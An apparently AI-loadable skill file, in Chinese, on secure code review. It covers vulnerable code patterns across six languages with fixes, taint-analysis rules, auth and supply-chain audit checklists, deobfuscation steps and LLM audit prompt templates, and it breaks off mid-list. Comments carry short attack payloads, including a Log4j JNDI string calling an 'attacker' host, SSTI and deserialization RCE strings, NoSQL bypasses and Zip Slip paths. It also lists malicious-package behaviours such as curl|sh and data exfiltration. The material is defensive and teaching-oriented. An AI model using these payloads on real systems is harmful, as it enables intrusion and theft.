---
name: secure-code-review
description: 安全代码审计深度专业技能 v3.0：攻击面驱动的审计优先级方法论（入口点→数据流→敏感操作）、多语言漏洞模式识别（Java/Python/Go/Node.js/PHP/C#）、数据流与污点分析、认证授权审计、业务逻辑审计、供应链代码审计（依赖投毒/后门植入/恶意包）、反混淆与对抗审计、AI 大模型辅助审计（LLM+SAST 协同/提示词模板/幻觉治理）、DevSecOps CI 集成与绕过、审计报告与证据链
metadata:
  version: 3.0.0
---

# 安全代码审计深度技能 v3.0

> **AI LOAD INSTRUCTION**: 攻击面驱动的安全代码审计专家方法论。聚焦攻击面建模→多语言漏洞模式→source-sink 数据流追踪→认证/业务逻辑专项→供应链与 AI 代码幻觉失效模式。产出必须附 source→sink→PoC 证据链。

## 概述

代码审计是发现漏洞根源的核心能力。v3.0 站在资深攻防专家视角，将审计方法论从"全量扫一遍"升级为**攻击面驱动的优先级审计**，系统化覆盖**攻击面映射 → 多语言漏洞模式 → 数据流/污点追踪 → 认证授权 → 业务逻辑 → 供应链 → 反混淆对抗 → AI 辅助 → DevSecOps 集成 → 证据链闭环**完整链路，聚焦于从代码中识别**可被真实利用**的安全缺陷，而非制造误报噪音。

### 核心概念
- **攻击面（Attack Surface）**：所有攻击者可触及的代码路径集合（HTTP 入口、消息队列、文件、定时任务、CLI），审计必须从入口点出发而非从文件出发
- **Source / Sink**：外部输入来源（Source）与危险操作调用点（Sink），二者之间的可达路径即漏洞本体
- **污点（Taint）**：标记为"不可信"的数据，经传播仍带污点，到达 Sink 即触发告警
- **可达性（Reachability）**：判定"这个危险函数是否真的能被外部输入触达"，是区分真漏洞与理论缺陷的关键
- **误报 / 漏报**：SAST 误报率普遍高达 60-90%（未调优可达 91%），漏报率（False Negative）是比误报更危险的"无声杀手"——干净扫描 ≠ 安全
- **CVSS / 证据链（Evidence Chain）**：漏洞分级标准与可复现证据（PoC、请求包、代码定位、时间线），决定报告能否被开发团队采信
- **二次注入 / 存储型污染**：数据先入库，后在其他查询/渲染上下文被拼接利用，静态工具最易漏检的链路
- **AI 辅助审计**：LLM 负责语义推理与误报过滤，确定性引擎（Semgrep/CodeQL）负责枚举与数据流，人工负责最终裁决——三者缺一不可

## 一、攻击面驱动的审计方法论

### 1.1 为什么必须从攻击面出发

传统 SAST 是 **sink-first**（从危险函数反推路径），能发现"可能危险"但无法回答"攻击者能否真的触达"。2026 年主流 AI 审计框架（如 Capital One VulnHunter）已反转思路：**从真实攻击入口点正向追踪**，沿攻击者实际路径经过认证、授权、校验等安全关卡，只有整条路径可行才上报。审计者必须以"攻击者视角"绘制入口点到敏感操作的地图。

### 1.2 入口点枚举（Entry Point 清单）

```
# HTTP 类
- 路由注册表（Spring @RequestMapping / Flask @app.route / Express app.get / Gin 路由组）
- 中间件/过滤器/拦截器（全局鉴权是否被跳过）
- 文件上传、下载接口
- 回调接口（Webhook、OAuth redirect_uri、支付回调——最容易绕过鉴权）
- GraphQL / gRPC / WebSocket 端点

# 非 HTTP 类
- 消息队列消费者（Kafka/RabbitMQ/SQS 监听器）
- 定时任务/批处理入口
- 反序列化入口（RMI/AMF/XML/JSON/YAML）
- 外部 API 集成点（第三方 SDK 回调）
- CLI / 运维命令入口

# 隐藏入口
- 未版本控制的接口（/admin、/debug、/actuator）
- 测试接口（测试代码误上生产）
- 调试开关（--debug、Env 变量切换的隐藏路由）
```

### 1.3 三步法：入口点 → 数据流 → 敏感操作

```
第一步 枚举入口点：全局搜索路由注册、消息监听、回调注册
第二步 追踪数据流：从入口参数出发，追踪其流向（请求体→DTO→Service→DAO）
第三步 定位敏感操作：标记沿路径上的危险 Sink（SQL/命令/文件/反序列化/SSRF/越权点）
产出物：入口点×Sink 的可达矩阵，作为审计优先级依据
```

**实战命令（快速定位入口点）：**
```bash
# Java Spring：路由注解
grep -rn "RequestMapping\|GetMapping\|PostMapping\|RestController" --include="*.java" src/ | head -50

# Python Flask/Django
grep -rn "@app.route\|urlpatterns\|path(" --include="*.py" . | head -50

# Node.js Express
grep -rn "app\.\(get\|post\|put\|delete\|use\)\|router\.\(get\|post\)" --include="*.js" . | head -50

# Go
grep -rn "r\.Handle\|mux\.Handle\|gin\.Default" --include="*.go" . | head -50

# PHP
grep -rn "route\|match\|dispatch" --include="*.php" app/ public/ | head -50
```

### 1.4 审计优先级矩阵

| 优先级 | 条件 | 动作 |
|-------|------|------|
| P0 | 未鉴权入口 + 直接到达命令/SQL/反序列化 Sink | 立即深挖，构造 PoC |
| P1 | 鉴权后入口 + 敏感操作 + 用户可控数据 | 深度数据流追踪 |
| P2 | 鉴权后入口 + 敏感操作 + 数据受限 | 抽查 + 逻辑审计 |
| P3 | 内部工具代码、无外部输入 | 依赖与配置审计为主 |

**排序因子：** 资产价值（数据敏感度）× 暴露程度（是否公网可达）× 可利用性（前置条件数量）× 影响（RCE>文件读写>信息泄露）。

### 1.5 五阶段标准流程

```
阶段1 侦察（Recon）：摸清技术栈、框架版本、依赖清单、认证模型
阶段2 映射（Map）：绘制攻击面与入口点清单
阶段3 深挖（Deep Dive）：对 P0/P1 目标做数据流追踪与模式匹配
阶段4 验证（Verify）：构造 PoC 验证可利用性（仅限授权环境）
阶段5 报告（Report）：证据链闭环（见第十三章）
```

## 二、多语言漏洞模式

### 2.1 Java 安全审计

**反序列化漏洞：**
```java
// 危险：未过滤的反序列化
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();  // 任意类反序列化 RCE

// 危险：Fastjson 解析
JSON.parseObject(userInput);  // @type 字段控制类加载，详见 fastjson-exploitation 技能

// 危险：YAML 反序列化（Spring Boot 内置 SnakeYAML）
Yaml yaml = new Yaml();
Object obj = yaml.load(userInput);  // !!class 标签 RCE

// 修复：白名单过滤
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.myapp.*;!*");
ois.setObjectInputFilter(filter);
// SnakeYAML 修复：yaml.loadAs(userInput, MyClass.class) 或自定义 Constructor 白名单
```

**JNDI 注入：**
```java
// 危险：用户可控的 JNDI 查询
Context ctx = new InitialContext();
Object obj = ctx.lookup(userInput);  // JNDI 注入 RCE（LDAP/RMI）

// 危险：JDBC URL 用户可控（连接字符串注入）
DriverManager.getConnection(userInputUrl);  // jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://...'
```

**表达式注入（SpEL/OGNL/MVEL）：**
```java
// 危险：表达式注入
SpelExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // T(java.lang.Runtime) 链
exp.getValue();

// 危险：OGNL（Struts2 历史漏洞面）
OgnlUtil.callMethod(userInput, context, root);

// 危险：模板引擎（Freemarker/Thymeleaf 表达式）
```

**SQL 注入（Java 特有）：**
```java
// 危险：字符串拼接
String sql = "SELECT * FROM users WHERE id = " + userId;
stmt.executeQuery(sql);

// 危险：MyBatis ${}（不转义）vs 安全 #{}
<select id="find">SELECT * FROM users WHERE name = '${name}'</select>  // ${} 拼接
<select id="find">SELECT * FROM users WHERE name = #{name}</select>  // #{} 参数化

// 危险：JPA 原生查询拼接 + JdbcTemplate 拼接
```

**XXE（Java）：**
```java
// 危险：未禁用外部实体的解析器
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
Document doc = factory.newDocumentBuilder().parse(inputStream);

// 危险：SAXParser / XMLInputFactory（StAX）默认配置
// 修复：显式禁用 DOCTYPE 与外部实体
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setXIncludeAware(false);
```

**SSRF（Java）：**
```java
// 危险：用户可控 URL → 内网/云元数据 169.254.169.254
URL url = new URL(userInput);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();

// 危险：Apache HttpClient / OkHttp 用户可控 URL
// 修复：协议白名单 + IP 解析后校验（防 DNS Rebinding，需二次解析比对）+ 内网段拦截
```

**Log4j2（CVE-2021-44228 类）：**
```java
// 危险：日志记录用户可控内容
log.info("user: " + userInput);  // ${jndi:ldap://attacker/a} 触发 JNDI
// 审计点：全库搜索 log.xxx() 且参数含用户输入的位置，确认 lookup 是否禁用
// 修复：升级 log4j-core >= 2.17.1，或 JVM 参数 -Dlog4j2.formatMsgNoLookups=true
```

**路径遍历/任意文件读写：**
```java
// 危险：getResource / ClassLoader 加载用户可控路径
String path = request.getParameter("file");
new File(baseDir + path);  // ../ 穿越

// 危险：Zip 解压（Zip Slip）
while (entries.hasMoreElements()) {
    ZipEntry entry = entries.nextElement();
    File outFile = new File(outDir, entry.getName());  // ../../../etc/cron.d/evil
}
// 修复：Paths.get(outDir).normalize() 后 startsWith 校验
```

### 2.2 Python 安全审计

```python
# 危险：命令注入
import os
os.system("ping " + user_input)
subprocess.call("cmd " + user_input, shell=True)

# 危险：反序列化
import pickle
data = pickle.loads(user_input)  # __reduce__ RCE
import marshal, shelve  # 同族风险

# 危险：SSTI（Jinja2/Flasks）
from jinja2 import Template
Template(user_input).render()  # {{config}} / {{''.__class__.__mro__[1].__subclasses__()}}

# 危险：SQL 注入
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")       # f-string 拼接
cursor.execute("SELECT ... WHERE id = %s" % user_id)               # % 格式化拼接

# 危险：路径遍历
open(os.path.join(base_dir, user_input))

# 危险：eval/exec/compile
eval(user_input); exec(user_input)

# 危险：YAML 不安全加载
import yaml
yaml.load(user_input)               # Python < 5.1 默认 unsafe
yaml.unsafe_load(user_input)        # 显式 unsafe，!!python/object 标签 RCE
yaml.safe_load(user_input)          # 修复

# 危险：框架路由参数直接进 ORM 未转义（Django 用 queryset 不传字符串）
```

**Python 特有审计点：**
- `os.path.join(base, user_input)` 中 user_input 若以 `/` 开头会**丢弃 base** 实现穿越——需 `os.path.realpath` + `startswith` 校验
- Flask `url_for(endpoint, **values)` 用户可控 endpoint 可访问任意视图（SSTI 之外的越权点）
- Celery 任务队列入口、`eval` 于 ORM 自定义字段（Django `JSONField` + `json.loads`）
- Pickle 攻击面：Redis 缓存、`session.serialize` 配置

### 2.3 Go 安全审计

```go
// 危险：命令注入
cmd := exec.Command("sh", "-c", userInput)  // 用户可控命令；应使用非 shell 参数数组形式
exec.Command("ping", userInput)  // 无 shell 时相对安全，但仍需参数白名单

// 危险：SQL 注入
db.Query("SELECT * FROM users WHERE id = " + id)
db.Query("SELECT * FROM users WHERE id = ?", id)  // 修复：占位符（注意 %s 拼接仍危险）

// 危险：路径遍历
http.ServeFile(w, r, filepath.Join(base, r.URL.Query().Get("file")))
// 需要 filepath.Clean + 前缀校验 + 拒绝 ../

// 危险：SSRF
resp, err := http.Get(userInput)  // 用户可控 URL
// 修复：net.ParseIP + 内网段校验（1024 以内的所有私有/回环/链路本地段）

// 危险：不安全的随机数
token := rand.Int()  // math/rand 可预测（Go 1.20 前全局自动播种仍不安全）
// 修复：crypto/rand

// 危险：模板注入（text/template 用户数据进模板）
tmpl.Execute(w, map[string]interface{}{"Cmd": userInput})  // {{.Cmd}} 可被 {{.Cmd "..."}} 调用

// Go 特有：整数溢出、nil 解引用、竞争条件（map 并发写）
// 修复模式：go vet -printf 等静态检查
```

### 2.4 Node.js / JavaScript 安全审计

```javascript
// 危险：命令注入
const { exec } = require('child_process');
exec('cmd ' + userInput);  // 应使用 execFile 或 {shell:false}

// 危险：原型污染
const merge = (target, source) => {
    for (let key in source) {
        target[key] = source[key];  // __proto__/constructor.prototype 污染
    }
};
// 输入 {"__proto__":{"polluted":true}} 即可污染，继而绕过 isAdmin 校验/污染 Object.prototype

// 危险：NoSQL 注入
db.users.find({ username: req.body.username });
// 输入 {"$gt": ""} 或 {"$ne": null} 绕过认证；{$where: "this.pwd=="} 触发 JS 执行

// 危险：SSTI（Pug/EJS/Handlebars）
const template = require('pug').compile(userInput);
// EJS: <%- include('/etc/passwd') %> 文件读取 / RCE

// 危险：路径遍历
res.sendFile(path.join(__dirname, req.query.file));
// 修复：path.resolve + startsWith 检查 + 拒绝绝对路径

// 危险：原型链上的反序列化（node-serialize / serialize-javascript 旧版）
const unserialize = require('node-serialize').unserialize;
unserialize(userInput);  // {"rce":"_$$ND_FUNC$$_function(){...}()"} RCE

// 危险：正则 DoS（ReDoS）—— 用户可控正则或用户输入触发灾难性回溯
new RegExp(userInput).test(largeString)

// 危险：eval/Function 构造器
eval(userInput); new Function(userInput)();

// 依赖面：__proto__ 污染链（lodash <4.17.11、minimist、qs 历史版本）
```

### 2.5 PHP 安全审计

```php
// 危险：文件包含（LFI/RFI）
include($_GET['page']);
include('php://filter/convert.base64-encode/resource=config');  // 伪协议读源码
// 修复：白名单 + realpath 校验

// 危险：命令执行
system("ping " . $_GET['host']);
exec("cmd " . $_POST['input']);
// 分隔符：; | & || && ` $() \n
// 危险：回调型命令执行 call_user_func($_GET['f'], $_GET['a']);

// 危险：反序列化
unserialize($_GET['data']);  // POP 链 RCE（phar:// 反序列化同样危险，file_exists 也会触发）
// 危险：phar 反序列化（利用 phar:// 协议在文件操作函数处触发）

// 危险：SQL 注入
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// 危险：preg_replace /e 修饰符（5.5 前）
preg_replace('/pattern/e', 'code', $input);

// 危险：类型混淆
if ($user == "admin") { }   // == 宽松比较：0=="admin" 为 true
if ($user === "admin") { }  // === 严格比较（修复）
// 危险：strcmp($user, "admin") 传数组返回 null → 绕过
// 危险：MD5 松散比较（0e... 魔法哈希）

// 危险：文件上传
move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $_FILES['file']['name']);
// 需：扩展名/Content-Type/MIME 三重校验 + 随机文件名 + 目录禁止执行

// 危险：.htaccess 覆盖 / 配置泄露
```

### 2.6 C# / .NET 安全审计

```csharp
// 危险：反序列化
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // RCE（BinaryFormatter 已标记 obsolete 禁用）
// 危险：DataContractSerializer / ObjectStateFormatter / LosFormatter / ViewState

// 危险：ViewState 未加密
// EnableViewStateMac=false；应启用机器密钥强加密

// 危险：LDAP 注入
DirectorySearcher searcher = new DirectorySearcher();
searcher.Filter = "(&(cn=" + userInput + "))";  // * 通配符注入、括号闭合注入

// 危险：XPath 注入
XmlNode node = doc.SelectSingleNode("//user[@name='" + userInput + "']");

// 危险：EF Core 原生 SQL / ToList 前拼接
db.Users.FromSqlRaw("SELECT * FROM Users WHERE Name = '" + name + "'");

// 危险：不安全反序列化（Json.NET TypeNameHandling.All）
JsonConvert.DeserializeObject(userInput, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // $type 属性 → RCE
});
// 修复：TypeNameHandling.None 或安全类白名单 + SerializationBinder
```

### 2.7 跨语言漏洞模式对照

| 漏洞类型 | Java | Python | Go | Node.js | PHP | C# |
|---------|------|--------|----|---------|-----|-----|
| SQL 注入 | JDBC/MyBatis ${} | f-string/% | 拼接 | 无（SQL 库为主） | 拼接 | FromSqlRaw |
| 命令注入 | ProcessBuilder 拼接 | os.system/subprocess | exec.Command sh -c | exec/child_process | system/exec | Process.Start |
| 反序列化 | ObjectInputStream/Fastjson | pickle/yaml.unsafe_load | gob（白名单需自建） | node-serialize | unserialize/phar | BinaryFormatter/Json.NET |
| 路径遍历 | File/ClassLoader | open/realpath | http.ServeFile | sendFile | include/readfile | File.ReadAllText |
| SSRF | URL/HttpClient | requests/urllib | http.Get | axios/fetch | curl/file_get_contents | HttpClient |
| 表达式注入 | SpEL/OGNL | eval/exec | text/template | eval/Function | preg_replace /e | DataSet.Select |

**共性审计铁律：** ① 输入验证 ≠ 安全（编码/二次编码/大小写/Unicode 规范化绕过）；② 输出编码看上下文（HTML/JS/URL/CSS/JSON 五类）；③ 框架默认值可能不安全（SnakeYAML、Json.NET 默认配置）。

## 三、数据流追踪与污点分析

### 3.1 Source-Sink 模型深化

```
Source（输入源）:
- HTTP 参数（GET/POST/Header/Cookie/Path 参数）
- 文件上传内容、文件名
- 数据库查询结果（二次注入）
- 外部 API / 消息队列响应
- 环境变量 / 配置文件（若可被运维/攻击者控制）
- 反序列化对象字段

Sink（危险操作）:
- SQL 查询（直接/ORM 原生）
- 命令执行（系统调用/进程启动）
- 文件操作（读写/删除/移动）
- 反序列化（readObject/load/deserialize）
- 表达式解析（eval/parse/模板渲染）
- LDAP/XPath/GraphQL 查询
- HTTP 请求（SSRF）
- 日志（Log4j lookup / 敏感信息泄露）
- 响应输出（XSS/JSONP/CRLF 注入）

追踪路径:
Source → [Transform: 编码/截断/拼接/解密] → [Sanitize? 净化是否完备] → Sink
```

### 3.2 追踪路径与二次注入

```
1. 认证流程：Login → Token 验证 → 会话管理 → 权限检查
2. 授权流程：请求 → 权限校验 → 数据访问 → 响应过滤
3. 文件操作：上传路径 → 存储路径 → 访问路径 → 下载路径（改名/后缀/大小写）
4. API 链路：请求解析 → 参数验证 → 业务逻辑 → 数据操作
5. 二次注入：注入点入库 → 查询拼接 → 存储型 XSS/二次 SQL 注入
```

**二次注入审计要点：**
- 入库时的"过滤"（转义）在**读库再次拼接**时失效——审计`SELECT`结果进入第二个 Sink 的路径
- 存储型 XSS：写库不编码 + 读库输出不编码的双重缺陷
- 存储型命令注入：任务队列 payload 由 DB/Redis 驱动

### 3.3 手工数据流追踪技巧

```bash
# 1. 从 Sink 反向找 Source：grep 危险函数，回溯调用链
grep -rn "executeQuery\|exec\|pickle.loads\|readObject" --include="*.java" src/

# 2. 追踪同名变量传播：函数调用链
grep -rn "processUserInput\|handleData\|validateAndProcess" --include="*.java" src/

# 3. IDE 辅助：VS Code 安装安全审计插件（Semgrep/Snyk/CodeQL）逐跳追踪
#    使用 "查找所有引用" + 调用层级视图

# 4. 利用 AST 工具导出调用图
semgrep scan --config=auto --json src/ | jq '.results[] | {path: .path, start: .start.line, check_id: .check_id}'
```

### 3.4 工具化污点分析实战

**Semgrep 自定义污点规则（写自己的 taint-tracking 规则）：**
```yaml
# semgrep-rules/taint-sqli.yaml
rules:
  - id: taint-sqli-python
    mode: taint
    pattern-sources:
      - pattern: request.args.get(...)
      - pattern: request.form.get(...)
    pattern-sinks:
      - pattern: cursor.execute(...)
      - pattern: execute(f"...")
    message: "用户输入未净化进入 SQL 执行"
    languages: [python]
    severity: ERROR
```
```bash
semgrep scan --config=semgrep-rules/taint-sqli.yaml ./src
```

**CodeQL 污点追踪查询（Java SQL 注入）：**
```ql
import java
import semmle.code.java.dataflow.TaintTracking
import semmle.code.java.security.SqlInjection

from SqlInjectionSink sink, RemoteFlowSource source
where sink.getAUse().getEnclosingCallable().getFile().getName() = "UserDao.java"
  or source instanceof RemoteFlowSource
select sink, source, "SQL 注入污点路径"
```
```bash
codeql database create ./db --language=java --source-root=./src
codeql database analyze ./db --format=sarif-latest --output=result.sarif security-java.qls
```

## 四、认证与授权审计

### 4.1 认证缺陷检查

```
- 弱密码策略（长度/复杂度/历史/字典）
- 暴力破解防护（速率限制/锁定/行为分析）
- 会话管理（Session 固定/劫持/超时/并发登录）
- Token 安全（JWT 签名算法混淆/过期/存储位置/泄漏）
- MFA 实现（绕过/降级/恢复码/短信拦截）
- OAuth 实现（redirect_uri/state/scope/code 复用）
- 密码存储（明文/弱 Hash/MD5/未加盐/旧算法迁移）
- 凭据默认值（admin/admin、出厂口令、硬编码测试账号）
- 登录响应差异（用户不存在 vs 密码错误 → 用户枚举）
```

### 4.2 授权缺陷检查

```
- 水平越权（IDOR：用户 A 访问用户 B 数据——资源 ID 是否绑定所有者）
- 垂直越权（普通用户访问管理员功能——RBAC 是否在服务端强制）
- 功能级越权（API 接口无权限校验、方法级 @PreAuthorize 缺失）
- 数据级越权（查询条件无所有者过滤、无 RLS）
- 文件级越权（路径遍历/未授权下载/临时文件可访问）
- API 越权（BOLA/BFLA/Mass Assignment 批量赋值）
- 缓存/静态资源越权（CDN 上的私密文件）
```

### 4.3 现代认证栈审计要点

**JWT：**
```
- 算法混淆攻击：RS256 密钥当 HS256 对称密钥使用（RS256→HS256）
- 签名验证缺失：alg=none、去掉签名段
- kid 注入：kid 参数用户可控 → 路径遍历读任意文件作密钥
- 过期/iss/aud 校验缺失
- Token 泄漏：URL 参数携带、前端 localStorage 存储（XSS 即失守）
```

**OAuth2 / OIDC：**
```
- redirect_uri 校验宽松：允许路径拼接/子域/通配符 → 授权码劫持
- state 参数缺失或固定 → CSRF
- scope 提权（openid→admin）
- code 交换无 PKCE、code 复用
- 隐式流程（response_type=token）token 进浏览器历史
```

### 4.4 越权检测的数据流方法

```
1. 找出所有携带资源标识符（id/uid/fileId/orderNo）的接口
2. 追踪该参数是否进入数据查询/文件操作
3. 检查查询/操作前是否有"资源所有者 = 当前用户"的强制校验
4. 检查校验是否可绕过（大小写 ID、负数、数组批量、未校验分支提前 return）
5. 特别关注：列表接口分页参数、批量操作接口、导出接口（常遗漏行级授权）
```

## 五、业务逻辑审计

### 5.1 支付/订单/积分

```
- 价格篡改（前端传价/单价×数量计算在后端/优惠叠加负价格）
- 数量负数、0 元支付、金额精度（浮点/分转元）
- 重复下单/重复支付回调（幂等键缺失）
- 退款逻辑（退款金额>实付、重复退款）
- 积分/余额竞态（并发双花）
```

### 5.2 优惠券/验证码/密码重置

```
- 优惠券：重复使用、超额抵扣、生成算法可预测、活动规则绕过
- 验证码：绕过（响应可预测/复用/OCR/短信轰炸）、竞态重放、删除后复用
- 密码重置：Token 可预测/泄露在响应体/邮件注入（\r\n 头注入）、校验顺序缺陷
- 注册流程：用户名冲突/邮箱验证绕过/批量注册（羊毛党）
- 投票/抽奖：Cookie/IP/设备指纹伪造、并发刷票、权重参数篡改
```

### 5.3 竞态条件审计（TOCTOU/并发）

```
- 检查点：Check（余额足够）与 Act（扣款）之间是否原子
- 寻找点：先查后改、先验证后执行、先上传后校验
- 审计技巧：
  - 搜索 "select 然后 update/insert" 的非事务对
  - 搜索缓存先写后验证、状态机无锁流转
  - 关注分布式锁缺失的库存/优惠券/兑换码操作
- 验证：并发脚本（500 并发）重放同一操作观察越界
```

## 六、供应链代码审计

### 6.1 依赖漏洞（SCA）

```
- 已知 CVE：npm audit / pip audit / trivy / Snyk / OWASP Dependency-Check
- 传递依赖（transitive）漏洞：直接依赖更新 ≠ 修复，需锁定传递链
- 版本过时/EOL：Log4j 1.x、Fastjson 1.x、老 Jackson 均不再出补丁
- 运行期组件：Docker 基础镜像、二进制依赖（go.sum/npm lockfile 校验）
```

### 6.2 恶意包与投毒手法

```
- Typosquatting：拼写相似包名（reacT、requests-lib、pthon）
- Combosquatting：热门包名组合（django-admin-utils）
- Dependency Confusion：私有依赖名被同名公开恶意包抢占（PyPI 优先于私有仓库）
- Repo Confusion / Starjacking：伪造仓库地址借热门项目星标增信
- 维护者账号劫持：合法包推送后门版本（XZ Utils、ua-parser-js、event-stream 前车之鉴）
- 安装钩子攻击：npm install 脚本/preinstall/postinstall 下载执行载荷
- 隐藏代码：Unicode 不可见字符、RTL 覆盖、混淆 eval、熵值高的编码载荷、超大文件跳过扫描
- divide-and-hide：恶意逻辑拆分到多个包，单包分析不可见
```

### 6.3 第三方库源码人工审计要点

```
- 只审安装钩子/构建脚本远不够：恶意代码可能藏于任何模块文件
- 优先审计：入口文件、setup.py/package.json scripts、加密/编码相关函数、网络调用
- 差分分析：比对发布制品与源码仓库差异（恶意代码常只进制品不进源码）
- 高危行为模式：
  - 混淆/编码的字符串、高熵 base64/hex 块
  - 域名硬编码、内网 IP、C2 特征
  - 环境变量/浏览器数据窃取（cookies/passwords/keys）
  - 静默外传（ping 外网、DNS 外带）
  - 自删除/下载执行（curl|sh、wget 到 tmp）
```

### 6.4 供应链检测实战命令

```bash
# npm 恶意包/依赖投毒扫描（2026 活跃恶意活动：GlassWorm、Flooding Dropper 等）
npx supply-chain-guard scan ./package-lock.json
npx supply-chain-guard scan ./          # 递归全仓

# 已知 CVE 检测
npm audit --json
pip audit
trivy fs --scanners vuln,secret,misconfig .
trivy repo https://github.com/org/repo       # 仓库级
grype ./                                      # Anchore 替代品
owasp-dependency-check.sh --scan ./pom.xml

# 密钥/凭据扫描（含 Git 历史）
gitleaks detect --source . --log-opts="--all"
trufflehog git https://github.com/org/repo --results=verified

# 依赖解析与锁定文件审计
pip-audit -r requirements.txt
npm ls --all                                    # 看传递依赖
go list -m all | grep -iE "可疑域名|私有仓库"
```

### 6.5 SBOM 与 SLSA 溯源

```
- SBOM 生成：syft generate ./ → SPDX/CycloneDX 格式
- 工具链构建：cosign 对镜像签名 + SLSA provenance（in-toto/DSSE attestation）
- 审计价值：SBOM 支撑漏洞回溯与投毒影响面评估
- 实战：
  syft dir:./src -o spdx-json > sbom.json
  cosign verify-attestation --type slsaprovenance <image>
```

## 七、反混淆与对抗审计

### 7.1 常见混淆技术识别

```
- 字符串混淆：字符串数组 + 索引引用、Base64/hex/Unicode 编码、拼接
- 控制流平坦化（Opaque Predicate）：大量 switch + 状态变量
- 动态生成：eval/Function 构造器、动态 import、document.write
- 标识符乱化：a/b/c 单字母变量、\_0x 前缀十六进制变量
- 打包器产物：webpack/rollup bundle、压缩混淆（minified）
- 加密执行：运行时解密再 eval（外层壳 + 内层载荷）
- 语言特定：JSFuck/JJEncode（仅符号）、PyArmor、Invoke-Obfuscation、ConfuserEx
- 隐藏数据：Steganography（图片隐写）、DNS TXT 编码
```

### 7.2 静态去混淆流程

```bash
# 1. 格式化还原可读性
npx prettier --write suspect.js
npx js-beautify suspect.js -o clean.js

# 2. 识别混淆器指纹（Obfuscator.IO / js-confuser 等）
npx identify-obfuscation suspect.js   # 或手工匹配特征

# 3. AST 分析提取字符串/调用
npx esprima clean.js > ast.json
npx eslint --no-eslintrc --rule 'no-eval: error' clean.js

# 4. 手工还原字符串数组（替换索引引用）
# 5. 关键字符串提取（URL/IOC）
grep -oE "https?://[^\"']+" clean.js
```

### 7.3 动态分析与沙箱

```bash
# 本地受控 Node VM 执行（拦截 eval/网络）
node --experimental-permission --allow-fs-read=./suspect.js -e "
  const fs = require('fs');
  const src = fs.readFileSync('suspect.js', 'utf8');
  // 用 Proxy 拦截全局函数调用，观察行为而不落地执行
"

# 浏览器沙箱：jsdom 加载 + 观察 document.write/网络请求
# 恶意样本注意：cuckoo/CAPE 沙箱跑全链（检测反沙箱）

# 网络行为捕获：在隔离网段用 netcat/HTTP 服务器记录回连
nc -lvnp 8080 > http.log
```

### 7.4 AI 辅助反混淆（2025-2026 新进展）

```
- Google CASCADE（ICSE 2026）：LLM 识别 prelude 函数 + 编译器 IR 变换，生产级还原 Obfuscator.IO 混淆，替代数百条硬编码规则
- Unweaver：35+ 确定性变换 + LLM 编排的多轮去混淆工作台
- ai-code-decompile：AI+AST 还原 webpack 产物/混淆 JS
- 方法论：先确定性变换（解码/展开）剥壳，再由 LLM 语义还原，二者交替迭代
- 限制：LLM 可能"自信地改写"出与原语义不符的代码——还原结果必须做行为等价验证
```

## 八、AI 大模型结合：AI 辅助代码审计

### 8.1 方法论与定位

AI 审计不是替代人工，而是"知识渊博但缺乏实战经验的实习生"：速度快、覆盖面广、语义理解强，但会误报、会幻觉、缺攻防直觉。2026 年基准（RealVuln）显示能力分层：**安全专用扫描器 > 通用强 LLM > 规则型 SAST**（F3 得分 73.0 vs 51.7 vs 17.7），但 AI 扫描 78% 漏报率（Cobalt 2026）意味着**干净结论不可信**。正确姿势：AI 做初步筛选与误报过滤，人工做裁决与 PoC。

**AI 审计五原则：**
1. 只把 LLM 当"筛选器+解释器"，不当"裁判官"
2. 所有 AI 发现必须落到代码行号 + 可复现调用链才算数
3. 要求模型给出"反例"（为什么可能不可利用）以对抗确认偏差
4. 高置信度阈值（≥0.9）才进入工单，低置信度归探索区人工复核
5. 提示词限定只基于提供的代码上下文推理，禁止编造不存在的 API/路径

### 8.2 提示词模板库（可直接复制）

**模板一：入口点枚举（侦察阶段）**
```
你是资深红队代码审计专家。以下是仓库结构（忽略 node_modules/vendor）。
请：(1) 列出所有 HTTP 入口（路由注册、控制器方法）；(2) 标注哪些入口缺少认证/授权
前置检查；(3) 标注哪些接收文件上传、URL、序列化数据、XML/JSON。只依据给定代码，
不要假设不存在的文件。输出格式：文件:行号 | 入口 | 输入类型 | 认证状态。
```

**模板二：Sink 定向审计**
```
分析以下代码片段是否存在可利用漏洞。只关注这些 Sink：
SQL 执行、命令执行、反序列化、文件读写、SSRF、表达式/模板渲染、认证绕过。
对每个发现：给出 文件:行号、从输入到 Sink 的完整数据流路径、前置利用条件、
给出一个"该漏洞不可利用"的反证理由。若无可利用漏洞，明确回答"无"，不要罗列理论风险。
<代码>
```

**模板三：业务逻辑越权（IDOR/BOLA）**
```
这是资源访问相关代码。审计是否存在水平/垂直越权：
(1) 资源 ID 是否绑定当前用户/会话；(2) 接口是否做服务端权限校验；
(3) 批量/列表接口是否过滤数据归属；(4) 是否存在未校验的分支提前 return。
输出：文件:行号 | 缺陷类型 | 攻击步骤（含请求样例）| 修复建议。
```

**模板四：误报反驳（对抗验证）**
```
你之前的结论是 <发现 X> 可利用。请以攻击者视角尝试推翻它：
(1) 是否有前置校验拦截输入？(2) 数据是否真的可到达该 Sink（跨函数/跨文件追踪）？
(3) 是否已有净化（过滤/编码/参数化）？(4) 框架或运行时是否默认缓解？
只有无法推翻时才确认漏洞。输出最终裁决与理由。
```

**模板五：LLM 与 SAST 输出联动**
```
以下是 Semgrep/CodeQL 对同一代码的告警输出（含规则 ID、文件行号、描述）。
请逐个判断：(1) 是真漏洞、误报、还是低风险；(2) 若为真，给出完整利用链；
(3) 按可利用性排序。只评估告警条目，不要新增告警。
<tool_output>
```

### 8.3 LLM 与 SAST 工具协同

```
推荐流水线（人机协同）:
1. Semgrep --config=auto 全量扫（秒级，高召回低精度）
2. CodeQL 高级查询跑 P0 模块（语义级污点追踪）
